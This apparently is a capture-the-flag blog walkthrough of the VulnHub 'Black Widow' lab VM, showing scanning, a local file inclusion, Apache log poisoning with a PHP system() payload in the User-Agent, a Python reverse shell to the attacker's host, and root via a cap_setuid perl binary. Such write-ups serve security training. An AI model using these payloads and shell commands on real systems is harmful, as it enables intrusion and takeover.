---
layout: post
title:  "VulnHub - Black Widow"
date:   2021-03-07 10:10:05 +0300
categories: [vulnhub,walkthrough]
pin: false
tags: [log poisoning,backups,User-Agent,strings,GTFObins,perl]
---
- You’ll find this vm in Vulnhub `https://www.vulnhub.com/entry/black-widow-1,637/`

- Difficulty : Medium

## Port Scan

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ nmap 10.0.2.190
  PORT      STATE SERVICE
  22/tcp    open  ssh
  80/tcp    open  http
  111/tcp   open  rpcbind
  2049/tcp  open  nfs
  3128/tcp  open  squid-http
{% endhighlight %}


## Directory Scan

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ gobuster dir -k -u http://blackwidow/  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.bak,.txt
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://blackwidow/
  [+] Threads:        10
  [+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Extensions:     php,bak,txt
  [+] Timeout:        10s
  ===============================================================
  2021/03/05 23:36:12 Starting gobuster
  ===============================================================
  /docs (Status: 301)
  /company (Status: 301)
  /js (Status: 301)
{% endhighlight %}

## Directory Scan

- `/company`

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ gobuster dir -k -u http://blackwidow/company  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.bak,.txt
  ===============================================================
  Gobuster v3.0.1
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
  ===============================================================
  [+] Url:            http://blackwidow/company
  [+] Threads:        10
  [+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
  [+] Status codes:   200,204,301,302,307,401,403
  [+] User Agent:     gobuster/3.0.1
  [+] Extensions:     php,bak,txt
  [+] Timeout:        10s
  ===============================================================
  2021/03/05 23:39:19 Starting gobuster
  ===============================================================
  /assets (Status: 301)
  /forms (Status: 301)
  /changelog.txt (Status: 200)
  /Readme.txt (Status: 200)
  /started.php (Status: 200)
  ===============================================================
  2021/03/05 23:48:37 Finished
  ===============================================================
{% endhighlight %}

## Find the Get parameter

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ wfuzz -w  /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  --hh 42271 'http://blackwidow/company/started.php?FUZZ=test'
  ********************************************************
  * Wfuzz 3.1.0 - The Web Fuzzer                         *
  ********************************************************

  Target: http://blackwidow/company/started.php?FUZZ=test
  Total requests: 220560

  =====================================================================
  ID           Response   Lines    Word       Chars       Payload
  =====================================================================

  000000759:   200        0 L      0 W        0 Ch        "file"
{% endhighlight %}

## Wfuzz - LFI Path Test

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ wfuzz -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt  --hh 0  'http://10.0.2.190/company/started.php?file=FUZZ'

  =====================================================================
  ID           Response   Lines    Word       Chars       Payload
  =====================================================================

  000000015:   200        29 L     43 W       1582 Ch     "../../../../../../../../../../../../../../etc/passwd"
  ^C
{% endhighlight %}

- So the valid path for LFI is  `../../../../../../../../../../../../../../`

- Note

If you don't find the log file at once with the below list, maybe you broke something in the Virtual Machine.
So you need to `reimport` the vm.

## Finding the wordlist

{% highlight sh %}
  ┌──(alienum㉿kali)-[~/Desktop/lfi-list]
  └─$ wget https://raw.githubusercontent.com/tjomk/wfuzz/master/wordlist/fuzzdb/attack-payloads/lfi/common-unix-httpd-log-locations.txt
{% endhighlight %}

##  Wfuzz - Log Files

{% highlight sh %}
  ┌──(alienum㉿kali)-[~/Desktop/lfi-list]
  └─$ wfuzz -w common-unix-httpd-log-locations.txt --hh 0  'http://10.0.2.190/company/started.php?file=../../../../../../../../../../../../../../../..FUZZ'

  =====================================================================
  ID           Response   Lines    Word       Chars       Payload
  =====================================================================

  000000019:   200        137 L    1994 W     26383 Ch    "/var/log/apache2/access.log"
{% endhighlight %}

## Log poisoning to RCE through User Agent

- Burpsuite
- Copy the following request to the Burpsuite repeater

```
GET /company/started.php HTTP/1.1
Host: 10.0.2.190
User-Agent: <?php system($_GET['cmd']); ?>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: clos
```

## Confirm RCE

{% highlight sh %}
  view-source:http://10.0.2.190/company/started.php?file=../../../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=id
  ...
  10.0.2.15 - - [06/Mar/2021:11:42:08 -0500] "GET /company/started.php HTTP/1.1" 200 7254 "-" "uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ...
{% endhighlight %}

## Reverse Shell

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.15",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

- Browser

```
view-source:http://10.0.2.190/company/started.php?file=../../../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.0.2.15%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```

- Listener

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ nc -lvp 4444    
  listening on [any] 4444 ...
  connect to [10.0.2.15] from 10.0.2.190 [10.0.2.190] 46568
  /bin/sh: 0: can't access tty; job control turned off
  $ /usr/bin/script -qc /bin/bash /dev/null
  www-data@blackwidow:/var/www/html/company$ export TERM=xterm
  export TERM=xterm
  www-data@blackwidow:/var/www/html/company$
{% endhighlight %}

## Searching for user password

{% highlight sh %}
  www-data@blackwidow:~$ cd /var/backups
  cd /var/backups
  www-data@blackwidow:/var/backups$ ls
  ls
  alternatives.tar.0     dpkg.diversions.0       dpkg.status	 passwd.bak
  apt.extended_states    dpkg.diversions.1.gz    dpkg.status.0	 shadow.bak
  apt.extended_states.0  dpkg.statoverride       dpkg.status.1.gz
  auth.log	       dpkg.statoverride.0     group.bak
  dpkg.diversions        dpkg.statoverride.1.gz  gshadow.bak
  www-data@blackwidow:/var/backups$ cat auth.log | grep -i "Invalid"
  cat auth.log | grep -i "Invalid"
  Dec 12 16:53:34 test sshd[28695]: Invalid user giulio from 192.168.1.109 port 7001
  Dec 12 16:53:37 test sshd[28695]: Failed password for invalid user giulio from 192.168.1.109 port 7001 ssh2
  Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
  Dec 12 16:56:46 test sshd[29560]: Failed password for invalid user ?V1p3r2020!? from 192.168.1.109 port 7090 ssh2
  Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
  Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
  Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
  Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
  Dec 12 16:56:43 test sshd[29560]: Invalid user ?V1p3r2020!? from 192.168.1.109 port 7090
  www-data@blackwidow:/var/backups$
{% endhighlight %}

- Credentials `viper`:`?V1p3r2020!?`

## User

{% highlight sh %}
  ┌──(alienum㉿kali)-[~]
  └─$ ssh viper@10.0.2.190                                                  255 ⨯
  viper@10.0.2.190's password: ?V1p3r2020!?
  Linux blackwidow 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

  The programs included with the Debian GNU/Linux system are free software;
  the exact distribution terms for each program are described in the
  individual files in /usr/share/doc/*/copyright.

  Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
  permitted by applicable law.
  Last login: Thu Dec 24 08:44:58 2020 from 192.168.1.103
  viper@blackwidow:~$ id
  uid=1001(viper) gid=1001(viper) groups=1001(viper)
  viper@blackwidow:~$ ls
  backup_site  local.txt
  viper@blackwidow:~$ cat local.txt
  d930fe79919376e6d08972dae222526b
  viper@blackwidow:~$
{% endhighlight %}

## Linux Capabilities

{% highlight sh %}
  viper@blackwidow:~$ /usr/sbin/getcap -r / 2>/dev/null
  /home/viper/backup_site/assets/vendor/weapon/arsenic = cap_setuid+ep
  /usr/bin/perl =
  /usr/bin/perl5.28.1 =
  /usr/bin/ping = cap_net_raw+ep
  /usr/lib/squid/pinger = cap_net_raw+ep
  viper@blackwidow:~$
{% endhighlight %}

## Root

- Download the arsenic binary
- Strings
- Perl

{% highlight sh %}
  ┌──(alienum㉿kali)-[~/Desktop]
  └─$ strings arsenic | grep -i "perl" | head -n 10
  Perl_pp_shmwrite
  Perl_sv_chop
  Perl_sv_setnv_mg
  Perl_instr
  Perl_package_version
  Perl_bytes_from_utf8
  Perl_rninstr
  Perl_sighandler
  Perl_sv_taint
  PerlIO_cleantable
  ...
{% endhighlight %}

## Perl - GTFObins

{% highlight sh %}
  viper@blackwidow:~$ /home/viper/backup_site/assets/vendor/weapon/arsenic -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
  #
  # cd /root
  # ls
  root.txt
  # cat root.txt


  ▄▄▄▄· ▄▄▌   ▄▄▄·  ▄▄· ▄ •▄     ▄▄▌ ▐ ▄▌▪  ·▄▄▄▄        ▄▄▌ ▐ ▄▌
  ▐█ ▀█▪██•  ▐█ ▀█ ▐█ ▌▪█▌▄▌▪    ██· █▌▐███ ██▪ ██ ▪     ██· █▌▐█
  ▐█▀▀█▄██▪  ▄█▀▀█ ██ ▄▄▐▀▀▄·    ██▪▐█▐▐▌▐█·▐█· ▐█▌ ▄█▀▄ ██▪▐█▐▐▌
  ██▄▪▐█▐█▌▐▌▐█ ▪▐▌▐███▌▐█.█▌    ▐█▌██▐█▌▐█▌██. ██ ▐█▌.▐▌▐█▌██▐█▌
  ·▀▀▀▀ .▀▀▀  ▀  ▀ ·▀▀▀ ·▀  ▀     ▀▀▀▀ ▀▪▀▀▀▀▀▀▀▀•  ▀█▄▀▪ ▀▀▀▀ ▀▪


  Congrats!

  You've rooted Black Widow!

  0xJin - mindsflee

  0780eb289a44ba17ea499ffa6322b335


  # alienum
{% endhighlight %}
